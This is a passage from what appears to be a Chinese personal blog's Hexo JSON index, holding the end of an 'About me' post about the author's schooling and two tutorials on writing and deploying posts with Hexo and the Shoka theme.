另外呢，四年级就回老家了，重庆市忠县（没错就是那个电竞城市），顺溪小学，家住皇华城（皇上住过的小岛）对面，临江，舒服，哈哈哈，也特能吃辣。这里我认识了，emm，很多人，现在都还在联系，影响我很大的雷爽（究极搞怪人，但和我是铁哥们，生死狙击打穿，后来初中也一个班），还有成绩很好的很多很多人，yhx，rj，xcy，yyr，还有个小胖 xzw。 **--- 初中：** 初中是笨人最传奇的时候了（好汉不提当年勇），笨人初中第一次月考年级第一（喷子别喷，学校 1200 人，都过去了，wuwu），而后一发不可收拾，直接保重点高中哩（只有两次没拿期末考试年级第一）。在学校吃喝玩乐，当班长（一位很好的班长初二离开了我接班），当纪律委员，（本班在笨人的带领下喜提重点班倒数第一），但此时仍然是社恐。 **--- 初三暑假：** 这段时光是我记忆很深刻的，我第一次见识到人外有人，天外有天。我和秦峰（现就读于某 C9）走过升学的红地毯，同学们羡慕的眼光里，在学校的循环播报祝福的广播声里（我觉得世界会被我征服，确实飘了），到了忠县最好的高中。我们会提前上高中课程，和全县前 50 的同学们学习，当时数学是不等式，物理是力和运动，每天吃了睡，睡了吃，生活很好，这里认识了超级外向的任剑辉，wh，jyr，还有我觉得很虚的李某某（抽象哥穿丝袜），还有邓子城，时间不长，情谊万千。 另外就是八中夏令营了，啊，全市前几百吧，太厉害了，我倒吸一口凉气。害 \\\\\\ 太多厉害的人了。 高中的印象还很深刻，先不写了。","path":"About-me/My-first-Boke/","date":"11-02","excerpt":"","tags":[{"name":"About Me","slug":"About-Me","permalink":"http://example.com/tags/About-Me/"}]},{"title":"基于HEXO的写博客tips","text":"&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; # 0. 踩坑 1. 图片问题： 图床不加载：添加一行 行高亮1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; 2. 自动编号问题 shoka 主题隐藏目录自带标题，并设置显示小标题_shoka 主题标签_宁理大神 1996 的博客 - CSDN 博客 # 1.links 怎么放好友链接，看这里 優萌初華 琉璃的医学 & 编程笔记 優萌初華 https://shoka.lostyu.me 優萌初華 琉璃的医学 & 编程笔记 # 2.code 代码块 使用 markdown-it-prism 进行代码高亮，支持显示行号、行高亮 mark 、命令行提示符 command 、代码块标题。 基本格式：[language][title][url][linktext][mark][command]基本格式： [language] [title] [url] [link text] [mark] [command] 基本格式：[language][title][url][linktext][mark][command] &lt;img src=&quot;https://gitee.com/murry_ari/murray/raw/master/images/image-20231107163442557.png&quot; alt=&quot;image-20231107163442557&quot; style=&quot;zoom:50%;&quot; /&gt; 举个栗子： 行高亮 mark:1,6-7123456import java.util.Scanner;...Scanner in = new Scanner (System.in);// 输入 Scan 之后，按下键盘 Alt + “/” 键，Eclipse 下自动补全。System.out.println (in.nextLine ());System.out.println (&quot;Hello&quot; + &quot;world.&quot;); 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1234567891011pwd/usr/home/chris/binls -latotal 2drwxr-xr-x 2 chris chris 11 Jan 10 16:48 .drwxr--r-x 45 chris chris 92 Feb 14 11:10 ..-rwxr-xr-x 1 chris chris 444 Aug 25 2013 backup-rwxr-xr-x 1 chris chris 642 Jan 17 14:42 deploygit add -Agit commit -m &quot;update&quot;git push 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)123456789101112131415161718192021```java 行高亮 www.baidu.com 参考链接 mark:1,6-7import java.util.Scanner;...Scanner in = new Scanner (System.in);// 输入 Scan 之后，按下键盘 Alt + “/” 键，Eclipse 下自动补全。System.out.println (in.nextLine ());System.out.println (&quot;Hello&quot; + &quot;world.&quot;);``````bash 命令行提示符 command:(&quot;[root@localhost] $&quot;:1,9-10||&quot;[admin@remotehost] #&quot;:4-6)pwd/usr/home/chris/binls -latotal 2drwxr-xr-x 2 chris chris 11 Jan 10 16:48 .drwxr--r-x 45 chris chris 92 Feb 14 11:10 ..-rwxr-xr-x 1 chris chris 444 Aug 25 2013 backup-rwxr-xr-x 1 chris chris 642 Jan 17 14:42 deploygit add -Agit commit -m &quot;update&quot;git push``` &lt;img src=&quot;https://gitee.com/murry_ari/murray/raw/master/images/image-20231108213412488.png&quot; alt=&quot;image-20231108213412488&quot; style=&quot;zoom:67%;&quot; /&gt; 常用到的指令： java 行高亮 mark:1, 某某 bash 命令提示符 command:(&quot;[root@你的名字] $&quot;:1,9-10||&quot;[admin@你的名字] #&quot;:4-6) # 3. 表情包 emoji 绘文字 本功能基于 markdown-it-emoji ，所有标签参考戳此：markdown-it-emoji/lib/data/full.json at master · markdown-it/markdown-it-emoji (github.com) 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)123:kissing_heart::ring::notes: 如：😘 💍 两个冒号 # 4. 文字特效 本功能基于 markdown-it-ins 、 markdown-it-bracketed-spans 和 markdown-it-attrs 本主题风格颜色通用样式：default、primary、success、info、warning、danger 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)12345678910111213141516171819202122++ 下划线 ++++ 波浪线 ++&#123;.wavy&#125;++ 着重点 ++&#123;.dot&#125;++ 紫色下划线 ++&#123;.primary&#125;++ 绿色波浪线 ++&#123;.wavy .success&#125;++ 黄色着重点 ++&#123;.dot .warning&#125;~~ 删除线～～~~ 红色删除线～～&#123;.danger&#125;== 荧光高亮 ==[赤橙黄绿青蓝紫]&#123;.rainbow&#125;[红色]&#123;.red&#125;[粉色]&#123;.pink&#125;[橙色]&#123;.orange&#125;[黄色]&#123;.yellow&#125;[绿色]&#123;.green&#125;[靛青]&#123;.aqua&#125;[蓝色]&#123;.blue&#125;[紫色]&#123;.purple&#125;[灰色]&#123;.grey&#125;快捷键 [Ctrl]&#123;.kbd&#125; + [C]&#123;.kbd .red&#125;H~2~029^th^ 这段代码因为自动被 pangu.js 处理了一下，加了几个空格，导致直接复制代码不能正常显示。 正确的代码是 下划线 删除线 荧光高亮 ，不能有空格哦。 # 5. 隐藏文字 行高亮12!! 黑幕黑幕黑幕黑幕黑幕黑幕！！： 鼠标滑过显示内容!! 模糊模糊模糊模糊模糊模糊！！&#123;.bulr&#125; ： 选中文字显示内容 !! 黑幕黑幕黑幕黑幕黑幕黑幕！！： 鼠标滑过显示内容 !! 模糊模糊模糊模糊模糊模糊！！{.bulr} ： 选中文字显示内容","path":"写博客教程/","date":"11-02","excerpt":"","tags":[{"name":"博客说明","slug":"博客说明","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/"}]},{"title":"基于hexo和shoka的博客使用教程","text":"# 1.hexo 官方教程 Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. # Create a new post 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo new &quot;My New Post&quot; More info: Writing # Run server 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo server More info: Server # Generate static files 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo generate More info: Generating # Deploy to remote sites 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo deploy More info: Deployment # 2. 参考博客 个人博客搭建完整版笔记 | pitt1997 = = 真正的大师永远都怀着一颗学徒的心 早教级别教你使用 Hexo 和 GitHub Pages 搭建属于自己的静态博客 - 搭建博客 - 前端设计 | MyBlog = MqyGalaxy | Blog = 爱好 ACG 的温馨小窝 (moeqy.com) Step.3 界面显示 - Theme Shoka Documentation - 二进制杂谈 - 计算机科学 | Yume Shoka = 優萌初華 = 有夢書架 (lostyu.me) # 3.Shoka 的一些配置和说明 我们已经完成 Hexo 默认安装以及部署，现在我们使用其他主题加载我们的个人博客。 Shoka 主题相关链接如下。 123456主题主页：https://shoka.lostyu.me/文档说明：https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/基本配置: https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/config/页面配置: https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/display/依赖插件: https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/dependents/ # 4. 发布博客 写一篇文章，步骤参考 # 创建文章 其中 title 为文章的标题。 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo new &quot;title&quot; 执行完成后 hexo 会根据目录下 scaffolds/post.md，在 source/_posts 文件夹下创建一个名为 title.md 的文件。 123 --- title: hello-worlddate: 2023-11-23 01:03:24tags: --- balabala..... 接下来就可以正式开始写文章了。 # 部署文章 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)123hexo g -chexo shexo d 执行完成之后再次访问就可以看到内容了～","path":"基于hexo和shoka的博客使用教程/","date":"11-02","excerpt":"","tags":[{"name":"博客说明","slug":"博客说明","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/"}]}],"categories":[],"tags":[{"name":"大创","slug":"大创","permalink":"http://example.com/tags/%E5%A4%A7%E5%88%9B/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"Foo","slug":"Foo","permalink":"http://example.com/tags/Foo/"},{"name":"Bar","slug":"Bar","permalink":"http://example.com/tags/Bar/"},{"name":"About Me","slug":"About-Me","permalink":"http://example.com/tags/About-Me/"},{"name":"博客说明","slug":"博客说明","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/"}]}